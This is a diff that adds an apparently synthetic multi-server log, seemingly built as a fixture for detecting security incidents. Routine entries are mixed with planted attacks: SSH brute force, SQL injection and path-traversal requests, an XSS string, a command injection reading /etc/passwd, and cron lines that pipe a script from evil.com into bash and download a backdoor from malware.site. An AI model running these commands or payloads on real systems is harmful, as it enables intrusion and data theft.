@@ -1,0 +1,76 @@
+Dec 16 10:00:01 app-server sshd[1234]: Accepted publickey for deploy from 192.168.1.10 port 52413 ssh2
+Dec 16 10:00:15 app-server nginx: 192.168.1.50 - - "GET /api/users HTTP/1.1" 200 1234
+Dec 16 10:00:16 app-server nginx: 192.168.1.50 - - "GET /api/products HTTP/1.1" 200 5678
+Dec 16 10:01:30 app-server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:xx:xx:xx SRC=45.33.32.156 DST=10.0.0.5 PROTO=TCP DPT=22
+Dec 16 10:02:00 db-server mysqld: Connection from 192.168.1.20
+Dec 16 10:02:30 app-server kernel: Memory cgroup out of memory: Kill process 8421 (java) score 950
+Dec 16 10:03:00 app-server sshd[2001]: Failed password for root from 45.33.32.156 port 44231 ssh2
+Dec 16 10:03:02 app-server sshd[2002]: Failed password for root from 45.33.32.156 port 44232 ssh2
+Dec 16 10:03:04 app-server sshd[2003]: Failed password for root from 45.33.32.156 port 44233 ssh2
+Dec 16 10:03:06 app-server sshd[2004]: Failed password for root from 45.33.32.156 port 44234 ssh2
+Dec 16 10:03:08 app-server sshd[2005]: Failed password for root from 45.33.32.156 port 44235 ssh2
+Dec 16 10:03:10 app-server sshd[2006]: Failed password for admin from 45.33.32.156 port 44236 ssh2
+Dec 16 10:03:12 app-server sshd[2007]: Failed password for admin from 45.33.32.156 port 44237 ssh2
+Dec 16 10:05:00 app-server nginx: 103.45.67.89 - - "GET /api/users?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 200 5432
+Dec 16 10:05:01 app-server nginx: 103.45.67.89 - - "GET /api/users?id=1%20UNION%20SELECT%20*%20FROM%20passwords HTTP/1.1" 200 8901
+Dec 16 10:05:02 app-server nginx: 103.45.67.89 - - "POST /api/login HTTP/1.1" 401 45
+Dec 16 10:06:00 db-server mysqld: Query took 45.234s: SELECT * FROM orders WHERE status='pending'
+Dec 16 10:06:30 app-server nginx: 192.168.1.50 - - "GET /admin/config HTTP/1.1" 200 2345
+Dec 16 10:07:00 app-server disk-monitor: /dev/sda1 usage: 94%
+Dec 16 10:07:30 app-server disk-monitor: /var/log usage: 97%
+Dec 16 10:08:00 app-server crond: (root) CMD (/usr/bin/curl http://evil.com/shell.sh | bash)
+Dec 16 10:10:00 db-server mysqld: Too many connections (max: 150, current: 150)
+Dec 16 10:10:30 app-server nginx: 192.168.1.100 - - "GET /.env HTTP/1.1" 404 162
+Dec 16 10:10:31 app-server nginx: 192.168.1.100 - - "GET /wp-admin HTTP/1.1" 404 162
+Dec 16 10:10:32 app-server nginx: 192.168.1.100 - - "GET /phpmyadmin HTTP/1.1" 404 162
+Dec 16 10:10:33 app-server nginx: 192.168.1.100 - - "GET /.git/config HTTP/1.1" 404 162
+Dec 16 10:15:00 app-server sshd[3001]: Accepted password for root from 203.0.113.50 port 22 ssh2
+Dec 16 10:15:30 app-server sudo: unknown user 'hacker' attempted to run sudo
+Dec 16 10:20:00 app-server nginx: 192.168.1.50 - - "GET /api/health HTTP/1.1" 200 15
+Dec 16 10:25:00 app-server systemd: Started backup.service
+Dec 16 10:25:30 app-server backup: Backup completed successfully: 2.3GB
+Dec 16 10:30:00 web-server nginx: 198.51.100.23 - - "POST /api/upload HTTP/1.1" 200 45123 "../../etc/passwd"
+Dec 16 10:30:05 web-server nginx: 198.51.100.23 - - "GET /uploads/../../../etc/shadow HTTP/1.1" 403 162
+Dec 16 10:31:00 app-server kernel: TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.
+Dec 16 10:32:00 mail-server postfix/smtpd[5421]: connect from unknown[185.234.72.10]
+Dec 16 10:32:01 mail-server postfix/smtpd[5421]: lost connection after AUTH from unknown[185.234.72.10]
+Dec 16 10:32:02 mail-server postfix/smtpd[5422]: connect from unknown[185.234.72.10]
+Dec 16 10:32:03 mail-server postfix/smtpd[5422]: lost connection after AUTH from unknown[185.234.72.10]
+Dec 16 10:32:04 mail-server postfix/smtpd[5423]: connect from unknown[185.234.72.10]
+Dec 16 10:33:00 app-server nginx: 10.0.0.50 - - "GET /api/admin/users HTTP/1.1" 200 8901
+Dec 16 10:33:01 app-server audit: USER_AUTH pid=9823 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct="root" exe="/usr/bin/su" hostname=? addr=? terminal=pts/0 res=failed'
+Dec 16 10:34:00 db-server mysqld: Aborted connection 12345 to db: 'production' user: 'webapp' host: '192.168.1.20' (Got timeout reading communication packets)
+Dec 16 10:35:00 app-server kernel: device eth0 entered promiscuous mode
+Dec 16 10:36:00 app-server nginx: 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 9012 "<script>alert('xss')</script>"
+Dec 16 10:37:00 app-server sshd[4001]: reverse mapping checking getaddrinfo for 156.32.33.45.in-addr.arpa failed
+Dec 16 10:38:00 app-server nginx: 45.33.32.156 - - "POST /api/login HTTP/1.1" 401 45
+Dec 16 10:38:01 app-server nginx: 45.33.32.156 - - "POST /api/login HTTP/1.1" 401 45
+Dec 16 10:38:02 app-server nginx: 45.33.32.156 - - "POST /api/login HTTP/1.1" 401 45
+Dec 16 10:38:03 app-server nginx: 45.33.32.156 - - "POST /api/login HTTP/1.1" 401 45
+Dec 16 10:38:04 app-server nginx: 45.33.32.156 - - "POST /api/login HTTP/1.1" 401 45
+Dec 16 10:39:00 app-server kernel: Firewall: *INVALID* IN=eth0 OUT= SRC=192.168.1.254 DST=192.168.1.10 PROTO=TCP SPT=443 DPT=8080
+Dec 16 10:40:00 app-server systemd: docker.service: Main process exited, code=exited, status=137/n/a
+Dec 16 10:40:01 app-server dockerd: Container 8a3b2c killed due to OOM
+Dec 16 10:41:00 app-server nginx: 203.0.113.100 - - "GET /api/debug?cmd=cat%20/etc/passwd HTTP/1.1" 200 1234
+Dec 16 10:42:00 db-server mysqld: [Warning] IP address '192.168.1.99' could not be resolved: Name or service not known
+Dec 16 10:43:00 app-server sshd[5001]: Did not receive identification string from 185.143.223.47
+Dec 16 10:44:00 app-server kernel: possible SYN flooding on port 443. Sending cookies.
+Dec 16 10:45:00 app-server nginx: 192.168.1.50 - - "GET /api/users HTTP/1.1" 200 5678
+Dec 16 10:46:00 app-server cron: (www-data) CMD (wget -q http://malware.site/backdoor.php -O /tmp/.hidden)
+Dec 16 10:47:00 app-server auditd: Audit daemon rotating log files
+Dec 16 10:48:00 app-server sshd[6001]: Accepted publickey for admin from 192.168.1.10 port 54321 ssh2
+Dec 16 10:49:00 app-server nginx: 192.168.1.50 - - "GET /api/reports HTTP/1.1" 200 12345
+Dec 16 10:50:00 app-server kernel: CPU0: Core temperature above threshold, cpu clock throttled
+Dec 16 10:51:00 db-server mysqld: Deadlock found when trying to get lock; try restarting transaction
+Dec 16 10:52:00 app-server nginx: 45.33.32.156 - - "GET /cgi-bin/test.cgi HTTP/1.1" 404 162
+Dec 16 10:52:01 app-server nginx: 45.33.32.156 - - "GET /cgi-bin/php HTTP/1.1" 404 162
+Dec 16 10:52:02 app-server nginx: 45.33.32.156 - - "GET /cgi-bin/php5 HTTP/1.1" 404 162
+Dec 16 10:53:00 app-server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Dec 16 10:54:00 app-server nginx: 192.168.1.50 - - "GET /api/health HTTP/1.1" 200 15
+Dec 16 10:55:00 app-server kernel: ata1.00: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0
+Dec 16 10:55:01 app-server kernel: ata1.00: BMDMA stat 0x25
+Dec 16 10:55:02 app-server kernel: ata1.00: failed command: READ DMA
+Dec 16 10:56:00 app-server smartd: Device: /dev/sda, 8 Currently unreadable (pending) sectors
+Dec 16 10:57:00 app-server nginx: 192.168.1.50 - - "GET /api/users HTTP/1.1" 200 5678
+Dec 16 10:58:00 app-server systemd: Starting Daily apt download activities...
+Dec 16 10:59:00 app-server nginx: 192.168.1.50 - - "POST /api/orders HTTP/1.1" 201 456
